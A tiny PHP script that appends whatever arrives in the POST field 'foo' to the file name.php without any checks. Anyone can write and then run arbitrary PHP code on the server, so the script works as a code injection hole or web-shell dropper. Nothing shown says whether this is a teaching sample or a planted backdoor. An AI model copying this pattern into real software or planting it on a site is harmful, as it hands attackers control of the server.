<?php

$name = $_POST['foo'];
file_put_contents('name.php', $name, FILE_APPEND);

?>